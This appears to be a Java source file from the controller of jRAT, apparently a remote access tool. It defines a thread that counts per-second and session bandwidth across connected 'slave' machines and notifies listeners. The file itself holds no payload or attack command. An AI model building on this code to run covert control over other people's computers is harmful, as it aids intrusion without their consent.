package se.jrat.controller.threads;

import java.util.ArrayList;
import java.util.List;

import se.jrat.controller.AbstractSlave;
import se.jrat.controller.Main;
import se.jrat.controller.listeners.GlobalNetworkMonitorListener;
import se.jrat.controller.listeners.NetworkMonitorListener;

public class NetworkCounter implements Runnable {
	
	private static final List<NetworkMonitorListener> INVIDUAL_LISTENERS = new ArrayList<NetworkMonitorListener>();
	private static final List<GlobalNetworkMonitorListener> GLOBAL_LISTENERS = new ArrayList<GlobalNetworkMonitorListener>();
	
	/**
	 * Total bandwidth this session
	 */
	public static long totalIn;
	public static long totalOut;
	
	/**
	 * Current bandwidth each second
	 */
	public static int currentIn;
	public static int currentOut;
	
	@Override
	public void run() {
		try {
			while (true) {
				Thread.sleep(1000L);

				int in = 0;
				int out = 0;
				
				for (AbstractSlave slave : Main.connections) {
					int sin = (int) slave.getCountingInputStream().getCount();
					int sout = (int) slave.getCountingOutputStream().getCount();
					in += sin;
					out += sout;
					
					for (NetworkMonitorListener listener : INVIDUAL_LISTENERS) {
						listener.onUpdate(slave, sin, sout);
					}
				}
				
				for (GlobalNetworkMonitorListener listener : GLOBAL_LISTENERS) {
					listener.onUpdate(in, out);
				}
							
				for (AbstractSlave slave : Main.connections) {
					slave.getCountingInputStream().reset();
					slave.getCountingOutputStream().reset();
				}
				
				currentIn = out;
				currentOut = in;
				totalIn += out;
				totalOut += in;
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}
	
	public static void addGlobalListener(GlobalNetworkMonitorListener listener) {
		GLOBAL_LISTENERS.add(listener);
	}
	
	public static void removeGlobalListener(GlobalNetworkMonitorListener listener) {
		GLOBAL_LISTENERS.remove(listener);
	}

	public static void addListener(NetworkMonitorListener listener) {
		INVIDUAL_LISTENERS.add(listener);
	}
	
	public static void removeListener(NetworkMonitorListener listener) {
		INVIDUAL_LISTENERS.remove(listener);
	}
}
